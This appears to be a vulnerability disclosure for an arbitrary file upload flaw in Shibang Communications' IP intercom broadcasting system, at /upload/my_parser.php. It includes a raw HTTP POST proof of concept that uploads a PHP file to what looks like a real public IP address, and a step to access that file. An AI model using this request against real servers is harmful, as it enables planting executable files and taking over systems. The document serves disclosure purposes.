There is an arbitrary file upload vulnerability in the IP network intercom broadcasting system of Shibang Communications Co., Ltd.

verison:v1.0

Vulnerability location:/upload/my_parser.php

1.My_parser.php directly uploads files to the /upload/files folder without any filtering for file uploads, causing arbitrary files to be uploaded.

![image](https://github.com/heidashuai5588/cve/assets/165545542/52749e51-3a38-40ad-9983-082280dda651)

![image](https://github.com/heidashuai5588/cve/assets/165545542/da4fd975-cbbf-4922-93ea-ccd34ae7f089)

2. Upload 123.php to the target server through POC
POC
```
POST /upload/my_parser.php HTTP/1.1
Host: 58.242.236.26:22222
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------316190348235048577772059862095
Content-Length: 241
Origin: http://58.242.236.26:22222
Connection: close
Referer: http://58.242.236.26:22222
X-Forwarded-For: 1.1.1.1

-----------------------------316190348235048577772059862095
Content-Disposition: form-data; name="upload"; filename="123.php"
Content-Type: application/octet-stream

1233
-----------------------------316190348235048577772059862095--
```
![image](https://github.com/heidashuai5588/cve/assets/165545542/b3db2239-30e5-4d3c-8ca6-6248212d5c4a)

3.Visit /upload/files/123.php
![image](https://github.com/heidashuai5588/cve/assets/165545542/07aa7c3f-1eac-43ea-9f31-7599692e2bdc)


